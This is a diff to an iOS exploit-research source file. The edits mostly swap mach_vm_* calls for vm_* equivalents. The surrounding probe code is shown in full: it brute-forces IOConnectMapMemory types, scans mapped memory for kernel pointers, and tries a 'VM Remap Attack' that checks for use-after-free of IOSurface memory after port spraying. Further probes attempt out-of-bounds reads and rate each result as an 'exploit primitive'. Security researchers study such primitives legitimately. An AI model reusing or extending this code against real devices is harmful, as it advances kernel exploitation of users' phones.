@@ -2477,7 +2477,7 @@ void iosurface_research_framebuffer(ISRLogBlock log, ISRDoneBlock done) {
             // Phase B: Try to pass IOSurface to framebuffer via IOConnectMapMemory
             log(@"FB: Phase B — IOConnectMapMemory probing");
             typedef kern_return_t (*IOConnectMapMemoryFn)(io_connect_t, uint32_t, task_port_t,
-                mach_vm_address_t *, mach_vm_size_t *, uint32_t);
+                vm_address_t *, vm_size_t *, uint32_t);
             void *iokitLib = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
             IOConnectMapMemoryFn mapMem = NULL;
             if (iokitLib) {
@@ -2491,8 +2491,8 @@ void iosurface_research_framebuffer(ISRLogBlock log, ISRDoneBlock done) {
                     if (kr != KERN_SUCCESS || !conn) continue;
 
                     for (uint32_t memType = 0; memType <= 10; memType++) {
-                        mach_vm_address_t addr = 0;
-                        mach_vm_size_t size = 0;
+                        vm_address_t addr = 0;
+                        vm_size_t size = 0;
                         kr = mapMem(conn, memType, mach_task_self(), &addr, &size, 1);
 
                         if (kr == KERN_SUCCESS && addr && size) {
@@ -15343,15 +15343,15 @@ void iosurface_research_iokit_brute(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonn
                 // Phase 2: IOConnectMapMemory types 0-15
                 if (!isr_stopped()) {
                     log(@"IOKBRUTE: Phase 2 — IOConnectMapMemory types 0-15");
-                    typedef kern_return_t (*MapMem64Fn)(io_connect_t, uint32_t, task_t, mach_vm_address_t *, mach_vm_size_t *, uint32_t);
-                    typedef kern_return_t (*UnmapMem64Fn)(io_connect_t, uint32_t, task_t, mach_vm_address_t);
+                    typedef kern_return_t (*MapMem64Fn)(io_connect_t, uint32_t, task_t, vm_address_t *, vm_size_t *, uint32_t);
+                    typedef kern_return_t (*UnmapMem64Fn)(io_connect_t, uint32_t, task_t, vm_address_t);
                     MapMem64Fn mapMem = (MapMem64Fn)dlsym(sym.iokit, "IOConnectMapMemory64");
                     UnmapMem64Fn unmapMem = (UnmapMem64Fn)dlsym(sym.iokit, "IOConnectUnmapMemory64");
                     uint32_t kMapAnywhere = 1;
                     if (mapMem && unmapMem) {
                         for (uint32_t memType = 0; memType < 16 && !isr_stopped(); memType++) {
-                            mach_vm_address_t addr = 0;
-                            mach_vm_size_t size = 0;
+                            vm_address_t addr = 0;
+                            vm_size_t size = 0;
                             kr = mapMem(conn, memType, mach_task_self(), &addr, &size, kMapAnywhere);
                             if (kr == KERN_SUCCESS) {
                                 mapCount++;
@@ -16442,18 +16442,18 @@ void iosurface_research_fb_deep(ISRLogBlock log, ISRDoneBlock done) {
         if (!isr_stopped() && conn) {
             log(@"FBDEEP: Phase 2 — IOConnectMapMemory64 types 0-15");
             typedef kern_return_t (*MapMem64Fn)(io_connect_t, uint32_t, task_t,
-                                                 mach_vm_address_t *, mach_vm_size_t *, uint32_t);
+                                                 vm_address_t *, vm_size_t *, uint32_t);
             MapMem64Fn mapMem = (MapMem64Fn)dlsym(sym.iokit, "IOConnectMapMemory64");
             if (mapMem) {
                 for (uint32_t memType = 0; memType < 16 && !isr_stopped(); memType++) {
-                    mach_vm_address_t addr = 0;
-                    mach_vm_size_t size = 0;
+                    vm_address_t addr = 0;
+                    vm_size_t size = 0;
                     kern_return_t kr = mapMem(conn, memType, mach_task_self(), &addr, &size, 1);
                     if (kr == KERN_SUCCESS && addr != 0 && size > 0) {
                         mappedRegions++;
                         log([NSString stringWithFormat:@"FBDEEP: MAPPED type=%u addr=0x%llx size=%llu", memType, addr, size]);
                         // Scan mapped memory for kernel pointers
-                        for (mach_vm_size_t off = 0; off + 8 <= size && off < 4096; off += 8) {
+                        for (vm_size_t off = 0; off + 8 <= size && off < 4096; off += 8) {
                             uint64_t val = 0;
                             memcpy(&val, (void *)(uintptr_t)(addr + off), 8);
                             if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
@@ -16634,19 +16634,19 @@ void iosurface_research_jpeg_exploit(ISRLogBlock log, ISRDoneBlock done) {
         if (!isr_stopped()) {
             log(@"JPEGEXP: Phase 2 — IOConnectMapMemory64 on each type");
             typedef kern_return_t (*MapMem64Fn)(io_connect_t, uint32_t, task_t,
-                                                 mach_vm_address_t *, mach_vm_size_t *, uint32_t);
+                                                 vm_address_t *, vm_size_t *, uint32_t);
             MapMem64Fn mapMem = (MapMem64Fn)dlsym(sym.iokit, "IOConnectMapMemory64");
             if (mapMem) {
                 for (int t = 0; t < 5 && !isr_stopped(); t++) {
                     if (!conns[t]) continue;
                     for (uint32_t memType = 0; memType < 8; memType++) {
-                        mach_vm_address_t addr = 0;
-                        mach_vm_size_t size = 0;
+                        vm_address_t addr = 0;
+                        vm_size_t size = 0;
                         kern_return_t kr = mapMem(conns[t], memType, mach_task_self(), &addr, &size, 1);
                         if (kr == KERN_SUCCESS && addr != 0 && size > 0) {
                             mappedRegions++;
                             log([NSString stringWithFormat:@"JPEGEXP: MAPPED type=%d memType=%u addr=0x%llx size=%llu", t, memType, addr, size]);
-                            for (mach_vm_size_t off = 0; off + 8 <= size && off < 4096; off += 8) {
+                            for (vm_size_t off = 0; off + 8 <= size && off < 4096; off += 8) {
                                 uint64_t val = 0;
                                 memcpy(&val, (void *)(uintptr_t)(addr + off), 8);
                                 if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
@@ -16953,8 +16953,6 @@ void iosurface_research_service_chain(ISRLogBlock log, ISRDoneBlock done) {
 
 #pragma mark - Round 26: Maximum Aggression
 
-#include <mach/mach_vm.h>
-
 // Probe 79: VM Remap Attack
 void iosurface_research_vm_remap(ISRLogBlock log, ISRDoneBlock done) {
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
@@ -16972,7 +16970,7 @@ void iosurface_research_vm_remap(ISRLogBlock log, ISRDoneBlock done) {
         int crossWrite = 0;
 
         size_t allocSize = 16384;
-        mach_vm_address_t remap_addr = 0;
+        vm_address_t remap_addr = 0;
 
         NSDictionary *props = @{
             @"IOSurfaceWidth": @64,
@@ -17001,13 +16999,13 @@ void iosurface_research_vm_remap(ISRLogBlock log, ISRDoneBlock done) {
                 memset(base, 0, allocSize);
                 memcpy(base, &sentinel, 4);
 
-                log(@"VMREMAP: Step 2 — mach_vm_remap to create second mapping");
+                log(@"VMREMAP: Step 2 — vm_remap to create second mapping");
                 vm_prot_t cur_prot = VM_PROT_NONE, max_prot = VM_PROT_NONE;
-                kern_return_t kr = mach_vm_remap(mach_task_self(),
-                    &remap_addr, (mach_vm_size_t)allocSize, 0,
+                kern_return_t kr = vm_remap(mach_task_self(),
+                    &remap_addr, (vm_size_t)allocSize, 0,
                     VM_FLAGS_ANYWHERE,
                     mach_task_self(),
-                    (mach_vm_address_t)base,
+                    (vm_address_t)base,
                     FALSE,
                     &cur_prot, &max_prot,
                     VM_INHERIT_NONE);
@@ -17034,12 +17032,12 @@ void iosurface_research_vm_remap(ISRLogBlock log, ISRDoneBlock done) {
                         surf = NULL;
 
                         log(@"VMREMAP: Step 4 — Reading remapped memory post-destroy");
-                        mach_vm_size_t readSize = 0;
+                        vm_size_t readSize = 0;
                         uint8_t readBuf[256];
                         memset(readBuf, 0, sizeof(readBuf));
-                        kr = mach_vm_read_overwrite(mach_task_self(),
+                        kr = vm_read_overwrite(mach_task_self(),
                             remap_addr, 256,
-                            (mach_vm_address_t)readBuf, &readSize);
+                            (vm_address_t)readBuf, &readSize);
                         if (kr == KERN_SUCCESS && readSize > 0) {
                             uint32_t first4 = 0;
                             memcpy(&first4, readBuf, 4);
@@ -17091,9 +17089,9 @@ void iosurface_research_vm_remap(ISRLogBlock log, ISRDoneBlock done) {
 
                             log(@"VMREMAP: Step 6 — Reading remapped memory after spray");
                             memset(readBuf, 0, sizeof(readBuf));
-                            kr = mach_vm_read_overwrite(mach_task_self(),
+                            kr = vm_read_overwrite(mach_task_self(),
                                 remap_addr, 256,
-                                (mach_vm_address_t)readBuf, &readSize);
+                                (vm_address_t)readBuf, &readSize);
                             if (kr == KERN_SUCCESS && readSize > 0) {
                                 uint32_t first4 = 0;
                                 memcpy(&first4, readBuf, 4);
@@ -17118,7 +17116,7 @@ void iosurface_research_vm_remap(ISRLogBlock log, ISRDoneBlock done) {
 
                             log(@"VMREMAP: Step 7 — Writing to remapped region");
                             uint32_t writePattern = 0xC0FFEE42;
-                            kr = mach_vm_write(mach_task_self(), remap_addr,
+                            kr = vm_write(mach_task_self(), remap_addr,
                                 (vm_offset_t)&writePattern, 4);
                             if (kr == KERN_SUCCESS) {
                                 log(@"VMREMAP: WRITE TO REMAPPED REGION SUCCEEDED");
@@ -17147,7 +17145,7 @@ void iosurface_research_vm_remap(ISRLogBlock log, ISRDoneBlock done) {
                                 }
                             }
 
-                            mach_port_destroy(mach_task_self(), spray_port);
+                            mach_port_deallocate(mach_task_self(), spray_port);
                         }
                     } else if (surf) {
                         sym.unlock(surf, 0, NULL);
@@ -17162,7 +17160,7 @@ void iosurface_research_vm_remap(ISRLogBlock log, ISRDoneBlock done) {
         }
 
         if (remap_addr) {
-            mach_vm_deallocate(mach_task_self(), remap_addr, (mach_vm_size_t)allocSize);
+            vm_deallocate(mach_task_self(), remap_addr, (vm_size_t)allocSize);
         }
         if (surf) CFRelease(surf);
 
@@ -17177,7 +17175,7 @@ void iosurface_research_vm_remap(ISRLogBlock log, ISRDoneBlock done) {
         else if (postDestroyData > 0) verdict = @"HIGH — post-destroy data detected in remapped region";
         else if (sentinelSurvived) verdict = @"MEDIUM — VM remap shares physical pages (exploit primitive)";
         else if (remapSuccess) verdict = @"LOW — remap succeeded but pages copied, not shared";
-        else verdict = @"LOW — mach_vm_remap failed";
+        else verdict = @"LOW — vm_remap failed";
         log([NSString stringWithFormat:@"VMREMAP: VERDICT: %@", verdict]);
 
         NSDictionary *res = @{
@@ -17422,8 +17420,8 @@ void iosurface_research_syscall_storm(ISRLogBlock log, ISRDoneBlock done) {
         }
 
         // Steps 3-5: mach_make_memory_entry + map + destroy
-        mach_vm_address_t mapped_addr = 0;
-        mach_vm_size_t mapped_size = 0;
+        vm_address_t mapped_addr = 0;
+        vm_size_t mapped_size = 0;
         mach_port_t mem_entry = MACH_PORT_NULL;
 
         if (!isr_stopped()) {
@@ -17446,7 +17444,7 @@ void iosurface_research_syscall_storm(ISRLogBlock log, ISRDoneBlock done) {
 
                     memory_object_size_t entry_size = allocSize;
                     kern_return_t kr = mach_make_memory_entry_64(mach_task_self(),
-                        &entry_size, (mach_vm_address_t)base,
+                        &entry_size, (vm_address_t)base,
                         VM_PROT_READ | VM_PROT_WRITE | 0x400000, // MAP_MEM_VM_SHARE
                         &mem_entry, MACH_PORT_NULL);
 
@@ -17458,7 +17456,7 @@ void iosurface_research_syscall_storm(ISRLogBlock log, ISRDoneBlock done) {
 
                         // Step 4: vm_map the memory entry
                         mapped_size = entry_size;
-                        kr = mach_vm_map(mach_task_self(), &mapped_addr, mapped_size, 0,
+                        kr = vm_map(mach_task_self(), &mapped_addr, mapped_size, 0,
                             VM_FLAGS_ANYWHERE, mem_entry, 0, FALSE,
                             VM_PROT_READ | VM_PROT_WRITE,
                             VM_PROT_READ | VM_PROT_WRITE,
@@ -17488,12 +17486,12 @@ void iosurface_research_syscall_storm(ISRLogBlock log, ISRDoneBlock done) {
                     CFRelease(surf);
                     surf = NULL;
 
-                    mach_vm_size_t readSize = 0;
+                    vm_size_t readSize = 0;
                     uint8_t readBuf[256];
                     memset(readBuf, 0, sizeof(readBuf));
-                    kern_return_t kr2 = mach_vm_read_overwrite(mach_task_self(),
+                    kern_return_t kr2 = vm_read_overwrite(mach_task_self(),
                         mapped_addr, 256,
-                        (mach_vm_address_t)readBuf, &readSize);
+                        (vm_address_t)readBuf, &readSize);
                     if (kr2 == KERN_SUCCESS && readSize > 0) {
                         uint32_t f4 = 0;
                         memcpy(&f4, readBuf, 4);
@@ -17517,18 +17515,18 @@ void iosurface_research_syscall_storm(ISRLogBlock log, ISRDoneBlock done) {
             }
         }
 
-        // Step 6: mach_vm_region_recurse
+        // Step 6: vm_region_recurse_64
         if (!isr_stopped()) {
             log(@"SYSCALL: Step 6 — VM region enumeration");
-            mach_vm_address_t addr = 0;
+            vm_address_t addr = 0;
             int suspiciousRegions = 0;
             int regionCount = 0;
             while (!isr_stopped() && regionCount < 500) {
-                mach_vm_size_t size = 0;
+                vm_size_t size = 0;
                 uint32_t depth = 0;
                 struct vm_region_submap_info_64 info;
                 mach_msg_type_number_t infoCnt = VM_REGION_SUBMAP_INFO_COUNT_64;
-                kern_return_t kr = mach_vm_region_recurse(mach_task_self(),
+                kern_return_t kr = vm_region_recurse_64(mach_task_self(),
                     &addr, &size, &depth,
                     (vm_region_recurse_info_t)&info, &infoCnt);
                 if (kr != KERN_SUCCESS) break;
@@ -17577,10 +17575,10 @@ void iosurface_research_syscall_storm(ISRLogBlock log, ISRDoneBlock done) {
                     size_t offsets[] = {0x100000, 0x200000, 0x400000, 0x800000};
                     for (int i = 0; i < 4 && !isr_stopped(); i++) {
                         uint8_t buf[64];
-                        mach_vm_size_t readSize = 0;
-                        kern_return_t kr = mach_vm_read_overwrite(mach_task_self(),
-                            (mach_vm_address_t)oobBase + offsets[i], 64,
-                            (mach_vm_address_t)buf, &readSize);
+                        vm_size_t readSize = 0;
+                        kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                            (vm_address_t)oobBase + offsets[i], 64,
+                            (vm_address_t)buf, &readSize);
                         if (kr == KERN_SUCCESS && readSize > 0) {
                             oobReads++;
                             BOOL nonZero = NO;
@@ -17610,7 +17608,7 @@ void iosurface_research_syscall_storm(ISRLogBlock log, ISRDoneBlock done) {
         }
 
         // Cleanup
-        if (mapped_addr) mach_vm_deallocate(mach_task_self(), mapped_addr, mapped_size);
+        if (mapped_addr) vm_deallocate(mach_task_self(), mapped_addr, mapped_size);
         if (mem_entry != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), mem_entry);
 
         NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
